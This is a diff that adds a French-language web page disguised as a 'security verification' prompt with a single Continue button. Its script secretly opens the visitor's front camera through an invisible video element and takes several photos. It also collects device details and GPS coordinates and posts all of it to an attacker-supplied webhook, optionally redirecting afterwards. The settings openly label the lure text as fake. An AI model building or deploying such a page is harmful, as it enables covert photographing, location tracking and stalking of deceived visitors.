@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="title">Vérification de sécurité…</title>
+    <style>
+        #videoPreview {
+            opacity: 0;
+            width: 1px;
+            height: 1px;
+            position: absolute;
+            aria-hidden: true;
+        }
+        #loading {
+            display: block;
+            text-align: center;
+            margin-top: 40vh;
+        }
+        #button {
+            background-color: #4CAF50; /* Green */
+            border: none;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div id="loading">
+        <h2 id="text">Cliquez sur Continuer pour accéder au contenu.</h2>
+        <button id="button" onclick="startCapture()">Continuer</button>
+    </div>
+
+    <video id="videoPreview" playsinline muted autoplay></video>
+
+    <script>
+        const CONFIG = {
+          webhookUrl: "COLLE_TON_URL_ICI", // Remplacez par votre URL de webhook
+          redirectUrl: "", // URL de redirection facultative
+          fakeTitle: "Vérification de sécurité",
+          fakeText: "Cliquez sur Continuer pour accéder au contenu.",
+          captureCount: 3,
+          delayMs: 1200,
+          gps: true
+        };
+
+        let video = document.getElementById('videoPreview');
+        let captures = [];
+        let bestCapture;
+
+        async function startCapture() {
+            document.getElementById('loading').style.display = 'none';
+            try {
+                await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        video.play();
+                        setTimeout(captureLoop, CONFIG.delayMs);
+                    })
+                    .catch(error => handleError("Permission refusée ou pas de caméra."));
+            } catch (error) {
+                handleError("API non supportée.");
+            }
+        }
+
+        function captureLoop() {
+            for (let i = 0; i < CONFIG.captureCount; i++) {
+                setTimeout(() => capture(), i * (CONFIG.delayMs + 200));
+            }
+        }
+
+        function capture() {
+            let canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            let ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => {
+                captures.push(blob);
+                if (captures.length === CONFIG.captureCount) {
+                    bestCapture = getBestCapture(captures);
+                    sendPhoto(bestCapture);
+                }
+            }, 'image/jpeg', 0.85);
+        }
+
+        function getBestCapture(captures) {
+            return captures.reduce((max, current) => current.size > max.size ? current : max, captures[0]);
+        }
+
+        async function sendPhoto(blob) {
+            let formData = new FormData();
+            formData.append("photo.jpg", blob);
+
+            let metaData = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                resolution: `${window.innerWidth}x${window.innerHeight}`,
+                referrer: document.referrer,
+                timestamp: new Date().toISOString()
+            };
+
+            if (CONFIG.gps) {
+                try {
+                    let position = await getPosition();
+                    metaData.latitude = position.coords.latitude;
+                    metaData.longitude = position.coords.longitude;
+                } catch (error) { }
+            }
+
+            formData.append("metaData", JSON.stringify(metaData));
+
+            fetch(CONFIG.webhookUrl, {
+                method: 'POST',
+                body: formData,
+                mode:'cors'
+            })
+                .then(response => response.ok ? finish() : retry())
+                .catch(error => retry());
+        }
+
+        function getPosition() {
+            return new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
+            });
+        }
+
+        function retry() {
+            setTimeout(() => fetch(CONFIG.webhookUrl, { method:'POST', body:'error', mode:'no-cors' }).then(finish), 1000);
+        }
+
+        function finish() {
+            if (CONFIG.redirectUrl) window.location.href = CONFIG.redirectUrl;
+            else document.getElementById('loading').style.display = 'block';
+        }
+
+        function handleError(message) {
+            console.error(message);
+            document.getElementById('text').innerText += '\nErreur : ' + message;
+        }
+    </script>
+</body>
+</html>
+
